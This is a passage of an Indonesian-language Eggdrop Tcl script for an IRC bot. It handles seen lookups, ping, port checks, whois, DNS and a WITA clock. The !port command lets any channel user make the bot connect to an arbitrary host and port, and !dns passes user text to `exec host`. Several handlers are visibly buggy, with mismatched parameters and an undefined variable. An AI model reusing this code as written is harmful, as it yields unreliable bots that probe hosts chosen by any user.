        if {[lindex $args 0] == "*"} {putdcc $idx "$hand, chanstats requires a channel arg, or a valid console channel." ; return 1}
        putdcc $idx "[bs_chanstats [lindex $args 0]]"
        return 1
      }
      bind pub -|- [string trim $bs(cmdchar)]chanstats bs_pubchanstats
      proc bs_pubchanstats {nick uhost hand chan args} {
        global bs ; set chan [string tolower $chan]
        if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) [string tolower $chan]] == -1)} {return 0}
        if {$bs(notice) == 1} {set target "notice $nick"} {set target "privmsg $chan"}
        if {[lindex $args 0] != ""} {set chan [lindex $args 0]} ; puthelp "$target :[semxseen] [bs_chanstats $chan]" ; return $bs(logqueries)
      }
      bind msg -|- chanstats bs_msgchanstats
      proc bs_msgchanstats {nick uhost hand args} {global bs ; if {[bs_flood $nick $uhost]} {return 0} ; puthelp "notice $nick :[semxseen] [bs_chanstats [lindex $args 0]]" ; return $bs(logqueries)}
      proc bs_chanstats {chan} {
        global bs_list ; set chan [string tolower $chan] ; if {![validchan $chan]} {return "I'm not on $chan."}
        set id [array startsearch bs_list] ; set bs_record [unixtime] ; set totalc 0 ; set totalm 0 ; set temp ""
        while {[array anymore bs_list $id]} {
          set item [array nextelement bs_list $id] ; set time [lindex $bs_list($item) 2] ; if {$time == ""} {continue}
          if {$chan == [string tolower [lindex $bs_list($item) 4]]} {
            if {$time < $bs_record} {set bs_record $time} ; incr totalc
            set addy [string tolower [maskhost [lindex $bs_list($item) 1]]]
            if {[lsearch -exact $temp $addy] == -1} {incr totalm ; lappend temp $addy}
          }
        }
        array donesearch bs_list $id ; set total [array size bs_list]
        return "$chan database sebanyak [expr 100*$totalc/$total]% ($totalc/$total) dari keseluruhan database yang ada. Di $chan, terdapat database total sebanyak $totalm host yang telah tersimpan dalam waktu [bs_when $bs_record]."
      }
      foreach chan [string tolower [channels]] {if {![info exists bs_botidle($chan)]} {set bs_botidle($chan) [unixtime]}}
      bind join -|- * bs_join_botidle
      proc bs_join_botidle {nick uhost hand chan} {
        global bs_botidle botnick
        if {$nick == $botnick} {
          set bs_botidle([string tolower $chan]) [unixtime]
        }
      }
      bind pub -|- [string trim $bs(cmdchar)]lastspoke lastspoke
proc lastspoke {nick uhost hand chan args} {
  global bs botnick bs_botidle
  set chan [string tolower $chan] ; if {[bs_flood $nick $uhost] || [lsearch -exact $bs(no_pub) $chan] >= 0 || ($bs(log_only) != "" && [lsearch -exact $bs(log_only) $chan] == -1)} {return 0}
  if {$bs(notice) == 1} {set target "notice $nick"} {set target "privmsg $chan"}
  set data [lindex [bs_filt [join $args]] 0]
  set ldata [string tolower $data] 
  if {[string match *\** $data]} {
    set chanlist [string tolower [chanlist $chan]]
    if {[lsearch -glob $chanlist $ldata] > -1} {set data [lindex [chanlist $chan] [lsearch -glob $chanlist $ldata]]}
  }
  if {[onchan $data $chan]} { 
    if {$ldata == [string tolower $botnick]} {puthelp "$target :[semxseen] $nick, must you waste my time?" ; return 1}
    set time [getchanidle $data $chan] ; set bottime [expr ([unixtime] - $bs_botidle($chan))/60]
    if {$time < $bottime} {
      if {$time > 0} {set diftime [bs_when [expr [unixtime] - $time*60 -15]]} {set diftime "kurang lebih semenit"}
      puthelp "$target :[semxseen] $data terakhir ngomong di chan $chan $diftime yang lalu."
      } {
        set diftime [bs_when $bs_botidle($chan)]
        puthelp "$target :[semxseen] $data tidak ngomong apapun sejak join $chan $diftime yang lalu."
      }
    }
    return 1
  } 
  bind msgm -|- "help seen" bs_help_msg_seen
  bind msgm -|- "help chanstats" bs_help_msg_chanstats
  bind msgm -|- "help seenstats" bs_help_msg_seenstats
  proc bs_help_msg_seen {nick uhost hand args} {
    global bs ; if {[bs_flood $nick $uhost]} {return 0}
    puthelp "notice $nick :###  seen <query> \[chan\]"
    puthelp "notice $nick :   Queries can be in the following formats:"
    puthelp "notice $nick :     'regular':  seen lamer; seen lamest "
    puthelp "notice $nick :     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan" ; return 0
  }
  proc bs_help_msg_chanstats {nick uhost hand args} {
    global bs ; if {[bs_flood $nick $uhost]} {return 0}
    puthelp "notice $nick :###  chanstats <chan>"
    puthelp "notice $nick :   Returns the usage statistics of #chan in the seen database." ; return 0
  }
  proc bs_help_msg_seenstats {nick uhost hand args} {
    global bs ; if {[bs_flood $nick $uhost]} {return 0}
    puthelp "notice $nick :###  seenstats"
    puthelp "notice $nick :   Returns the status of the bseen database." ; return 0
  }
  bind dcc -|- seenversion bs_version
  proc bs_version {hand idx args} {global bs ; putidx $idx "###  Bass's Seen script."}
  bind dcc -|- help bs_help_dcc
  proc bs_help_dcc {hand idx args} {
    global bs
    switch -- $args {
      seen {
        putidx $idx "###  seen <query> \[chan\]" ; putidx $idx "   Queries can be in the following formats:"
        putidx $idx "     'regular':  seen lamer; seen lamest " ; putidx $idx "     'masked':   seen *l?mer*; seen *.lame.com; seen *.edu #mychan"
      }
      seennick {putidx $idx "###  seen <nick>"}
      chanstats {putidx $idx "###  chanstats <chan>" ; putidx $idx "   Returns the usage statistics of #chan in the seen database."}
      seenstats {putidx $idx "###  seenstats" ; putidx $idx "   Returns the status of the bseen database."}
      unseen {if {[matchattr $hand n]} {putidx $idx "###  unseen <chan>" ; putidx $idx "   Deletes all <chan> entries from the bseen database."}}
      default {*dcc:help $hand $idx [join $args] ; return 0} 
      } ; return 1
    }
######################################
#    seen sections end
######################################
######################################
#    ping sections end
######################################
proc pPingTimeout {} {
  global vPingOperation
  set schan [lindex $vPingOperation 0]
  set snick [lindex $vPingOperation 1]
  set tnick [lindex $vPingOperation 2]
  putserv "PRIVMSG $schan :\00304Error\003 (\00314$snick\003) time out saat mencoba ping ke \00307$tnick\003"
  unset vPingOperation
  return 0
}
proc semx_dapatctcr {nick uhost hand dest keyword txt} {
  global vPingOperation server
  if {[info exists vPingOperation]} {
    set pingserver [lindex [split $server :] 0]
    set schan [lindex $vPingOperation 0]
    set snick [lindex $vPingOperation 1]
    set tnick [lindex $vPingOperation 2]
    set time1 [lindex $vPingOperation 3]
    if {([string equal -nocase $nick $tnick]) && ([regexp -- {^[0-9]+$} $txt])} {
      set time2 [expr {[clock clicks -milliseconds] % 16777216}]
      set elapsed [expr {(($time2 - $time1) % 16777216) / 1000.0}]
      set char1 "\u00BB"
      set char2 "\u00AB"
      if {[expr {round($elapsed / 0.5)}] > 10} {set red 10} else {set red [expr {round($elapsed / 0.5)}]}
      set green [expr {10 - $red}]
      set output "\00309[string repeat $char1 $green]\003|\00304[string repeat $char2 $red]\003"
      putserv "PRIVMSG $schan :15H14a01([vrandom]s01)14i15l (\00314$tnick\003) $output $elapsed detik dari \003[vrandom]$pingserver\003"
      unset vPingOperation
      pPingKillutimer
    }
  }
  return 0
}
proc pPingKillutimer {} {
  foreach item [utimers] {
    if {[string equal pPingTimeout [lindex $item 1]]} {
      killutimer [lindex $item 2]
    }
  }
  return 0
}
proc semx_ping {nick uhost hand channel txt} {
  global vPingOperation
  if {[channel get $channel ping]} {
    switch -- [llength [split [string trim $txt]]] {
      0 {set tnick $nick}
      1 {set tnick [string trim $txt]}
      default {
        putserv "PRIVMSG $channel :\00304Error\003 (\00314$nick\003) syntax yang benar adalah \00307!ping ?target?\003"
        return 0
      }
    }
    if {![info exists vPingOperation]} {
      if {[regexp -- {^[\x41-\x7D][-\d\x41-\x7D]*$} $tnick]} {
        set time1 [expr {[clock clicks -milliseconds] % 16777216}]
        putquick "PRIVMSG $tnick :\001PING [unixtime]\001"
        utimer 20 pPingTimeout
        set vPingOperation [list $channel $nick $tnick $time1]
        } else {putserv "PRIVMSG $channel :\00304Error\003 (\00314$nick\003) \00307$tnick\003 nick tidak valid"}
        } else {putserv "PRIVMSG $channel :\00304Error\003 (\00314$nick\003) proses ping masih menunggu, mohon tunggu"}
      }
      return 0
    }
    proc semx_rawoff {from keyword txt} {
      global vPingOperation
      if {[info exists vPingOperation]} {
        set schan [lindex $vPingOperation 0]
        set snick [lindex $vPingOperation 1]
        set tnick [lindex $vPingOperation 2]
        if {[string equal -nocase $tnick [lindex [split $txt] 1]]} {
          putserv "PRIVMSG $schan :\00304Error\003 (\00314$snick\003) \00307$tnick\003 tidak online"
          unset vPingOperation
          pPingKillutimer
        }
      }
      return 0
    }
######################################
#    ping sections end
######################################
######################################
#    port sections 
######################################
proc semx_portchk {nick uhost hand chan text} {
  if {![channel get $chan port]} { return 0 }
  set host [lindex [split $text] 0]
  set port [lindex [split $text] 1]
  if {$port == ""} {
    putquick "NOTICE $nick :14P01([vrandom]o01)14r15t format = \002!port host port\002"
  } else {
    if {[catch {set sock [socket -async $host $port]} error]} {
      putquick "PRIVMSG $chan :14P01([vrandom]o01)14r15t koneksi ke \002$host ($port)\002 \00304ditolak..!!!\003"
    } else {
      set timerid [utimer 15 [list portcheck_timeout_pub $chan $sock $host $port]]
      fileevent $sock writable [list portcheck_connected_pub $chan $sock $host $port $timerid]
    }
  }
}
proc portcheck_timeout_pub {chan sock host port} {
  close $sock
  putquick "PRIVMSG $chan :14P01([vrandom]o01)14r15t Koneksi ke \002$host ($port)\002 \00304timeout..!!!\003"
}
proc portcheck_connected_pub {chan sock host port timerid} {
  if {![channel get $chan port]} { return 0 }
  killutimer $timerid
  set error [fconfigure $sock -error]
  if {$error != ""} {
    close $sock
    putquick "PRIVMSG $chan :14P01([vrandom]o01)14r15t Koneksi ke \002$host ($port)\002 \00304gagal..!!!\003"
  } else {
    fileevent $sock writable {}
    fileevent $sock readable [list portcheck_read_pub $chan $sock $host $port]
    putquick "PRIVMSG $chan :14P01([vrandom]o01)14r15t Koneksi ke \002$host ($port)\002 \00303diterima\003"
  }
}
proc portcheck_read_pub {sock} {
  if {[gets $sock read] == -1} {
    putquick "PRIVMSG $chan :14P01([vrandom]o01)14r15t Koneksi soket ke \002$host ($port)\002 \00304ditutup..!!!\003"
    close $sock
  }
  close $sock
}
######################################
#    port sections end
######################################
######################################
#    jam sections
######################################
#######################################################################
# %% - Insert a %.                                                    #
# %a - Abbreviated weekday name (Mon, Tue, etc.).                     #
# %A - Full weekday name (Monday, Tuesday, etc.).                     #
# %b - Abbreviated month name (Jan, Feb, etc.).                       #
# %B - Full month name.                                               #
# %c - Locale specific date and time.                                 #
# %d - Day of month (01 - 31).                                        #
# %H - Hour in 24-hour format (00 - 23).                              #
# %I - Hour in 12-hour format (00 - 12).                              #
# %j - Day of year (001 - 366).                                       #
# %m - Month number (01 - 12).                                        #
# %M - Minute (00 - 59).                                              #
# %p - AM/PM indicator.                                               #
# %S - Seconds (00 - 59).                                             #
# %U - Week of year (00 - 52), Sunday is the first day of the week.   #
# %w - Weekday number (Sunday = 0).                                   #
# %W - Week of year (00 - 52), Monday is the first day of the week.   #
# %x - Locale specific date format.                                   #
# %X - Locale specific time format.                                   #
# %y - Year without century (00 - 99).                                #
# %Y - Year with century (e.g. 1990)                                  #
# %Z - Time zone name.                                                #
# Supported on some systems only:                                     #
# %D - Date as %m/%d/%y.                                              #
# %e - Day of month (1 - 31), no leading zeros.                       #
# %h - Abbreviated month name.                                        #
# %n - Insert a newline.                                              #
# %r - Time as %I:%M:%S %p.                                           #
# %R - Time as %H:%M.                                                 #
# %t - Insert a tab.                                                  #
# %T - Time as %H:%M:%S.                                              #
#######################################################################
set semx_format "%I:%M:%S %p %A, %d %B %Y"
proc saklarjam {} {
  global jam_on
  if {$jam_on == "on"} {
    return 1
  } {
    return 0
  }
}
proc semx_jam {nick uhost hand chan text} {
  if {[saklarjam] == 0} { return 0 }
  global semx_format
  set jam [clock format [clock seconds] -timezone :Asia/Makassar -format $semx_format]
  regsub -all {Sunday} $jam "\00304Minggu\003" jam
  regsub -all {Monday} $jam "\00303Senin\003" jam
  regsub -all {Tuesday} $jam "\00303Selasa\003" jam
  regsub -all {Wednesday} $jam "\00303Rabu\003" jam
  regsub -all {Thursday} $jam "\00303Kamis\003" jam
  regsub -all {Friday} $jam "\00303Jumat\003" jam
  regsub -all {Saturday} $jam "\00303Sabtu\003" jam
  regsub -all {January} $jam "\00305Januari\003" jam
  regsub -all {February} $jam "\00313Februari\003" jam
  regsub -all {March} $jam "\00302Maret\003" jam
  regsub -all {April} $jam "\00310April\003" jam
  regsub -all {May} $jam "\00314Mei\003" jam
  regsub -all {June} $jam "\00308Juni\003" jam
  regsub -all {July} $jam "\00307Juli\003" jam
  regsub -all {August} $jam "\00311Agustus\003" jam
  regsub -all {September} $jam "\00304September\003" jam
  regsub -all {October} $jam "\00309Oktober\003" jam
  regsub -all {November} $jam "\00313November\003" jam
  regsub -all {December} $jam "\00303Desember\003" jam
  puthelp "privmsg $chan :$jam - WITA"
}
######################################
#    jam sections end
######################################
######################################
#    whois sections
######################################
proc whois:nick { nickname hostname handle channel arguments } {
  global whois
  if {![channel get $channel whois]} { return 0 }
  set target [lindex [split $arguments] 0]
  if {$target == ""} {
    putquick "PRIVMSG $channel :[semx_vern]"
    return 0
  }
  putquick "WHOIS $target $target"
  set ::whoischannel $channel
  set ::whoistarget $target
  bind RAW - 402 whois:nosuch
  bind RAW - 311 whois:info
  bind RAW - 319 whois:channels
  bind RAW - 301 whois:away
  bind RAW - 313 whois:ircop
  bind RAW - 307 whois:log
  bind RAW - 330 whois:auth
  bind RAW - 317 whois:idle
  bind RAW - 318 whois:end
}
proc whois:putmsg { channel arguments } {
  putquick "PRIVMSG $channel :$arguments"
}
proc whois:info { from keyword arguments } {
  set channel $::whoischannel
  set nickname [lindex [split $arguments] 1]
  set ident [lindex [split $arguments] 2]
  set host [lindex [split $arguments] 3]
  set realname [string range [join [lrange $arguments 5 end]] 1 end]
  whois:putmsg $channel "\00304\[\003$nickname\00304\]\003 - $ident@$host * $realname"
}
proc whois:ircop { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  set status [lrange $arguments 3 end]
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 is $status"
}
proc whois:away { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  set awaymessage [string range [join [lrange $arguments 2 end]] 1 end]
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 is away: $awaymessage"
}
proc whois:channels { from keyword arguments } {
  set channel $::whoischannel
  set channels [string range [join [lrange $arguments 2 end]] 1 end]
  regsub -all "\#" $channels "" channels
  set target $::whoistarget
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 on $channels"
}
proc whois:auth { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  set authname [lindex [split $arguments] 2]
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 is authed as $authname"
}
proc whois:log { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  set authname [lindex [split $arguments] 2]
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 is logged in to services"
}
proc whois:nosuch { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  whois:putmsg $channel "No such nickname \"$target\""
  whois:end
}
proc whois:idle { from keyword arguments } {
  set channel $::whoischannel
  set target $::whoistarget
  set idletime [lindex [split $arguments] 2]
  set signon [lindex [split $arguments] 3]
  whois:putmsg $channel "\00304\[\003$target\00304\]\003 has been idle for [duration $idletime]. signon time [ctime $signon]"
}
proc whois:end { from keyword arguments } {
  unbind RAW - 402 whois:nosuch
  unbind RAW - 311 whois:info
  unbind RAW - 319 whois:channels
  unbind RAW - 301 whois:away
  unbind RAW - 313 whois:ircop
  unbind RAW - 307 whois:log
  unbind RAW - 330 whois:auth
  unbind RAW - 317 whois:idle
  unbind RAW - 318 whois:end
}
######################################
#    whois sections end
######################################
######################################
#    dns sections
######################################
proc alias {chan als data} {
  foreach nals $als {
    if {[regexp {[.]} [lindex $data [expr $nals + 2]]]} {
      set alias [lindex $data [expr $nals + 2]]
      regsub -all {\.} $alias "\00304.\00302" alias
      putserv "privmsg $chan :-\00304\[\00314alias\00304\]\003[vrandom] \u27b5 \00302$alias"
    }
  }
}
proc ipv {chan dip data} {
  foreach ipv $dip {
    if {[regexp {[.]} [lindex $data [expr $ipv + 1]]]} {
      set ipv4 [lindex $data [expr $ipv + 1]]
      regsub -all {\.} $ipv4 "\00304.\00302" ipv4
      putserv "privmsg $chan :-\00304\[\00314ipv4\00304\]\003[vrandom] \u27b5 \00302$ipv4"
    }
    if {[regexp {[:]} [lindex $data [expr $ipv + 1]]]} {
      set ipv6 [lindex $data [expr $ipv + 1]]
      regsub -all {\:} $ipv6 "\00304:\00302" ipv6
      putserv "privmsg $chan :-\00304\[\00314ipv6\00304\]\003[vrandom] \u27b5 \00302$ipv6"
    }
  }
}
proc domain {chan dmn data} {
  foreach ndmn $dmn {
    if {[regexp {[.]} [lindex $data [expr $ndmn + 1]]]} {
      set domain [lindex $data [expr $ndmn + 1]]
      regsub -all {\.} $domain "\00304.\00302" domain
      putserv "privmsg $chan :-\00304\[\00314resolve\00304\]\003[vrandom] \u27b5 \00302$domain"
    }
  }
}
proc semx_pub`dns {nick uhost hand chan text} {
  if {![channel get $chan dns]} { return 0 }
  set host [lindex $text 0]
  if {$host == ""} { puthelp "notice $unick :format = !dns <host>": return 0 }
  if {[catch {set rdata [exec host $host]}]} {
    putserv "privmsg $chan :\003[vrandom]Tidak ada data..!!!\003"
  } {
    foreach odata $rdata {
      append data "$odata "
    }
    set als [lsearch -all $data "alias"]
    set dip [lsearch -all $data "address"]
    set dmn [lsearch -all $data "pointer"]
    alias $chan $als $data
    ipv $chan $dip $data
    domain $chan $dmn $data
  }
}
######################################
#    dns sections end
######################################
set servers {
  irc6.evochat.co.id:6667
 # irc.totabuan.id:6667
}

putlog "#################################"
putlog "#       TCL Kontrol Dasar       #"
putlog "#  Ditulis oleh sm aKa sEm     #"
putlog "#           1991-09-05          #"
putlog "#################################"
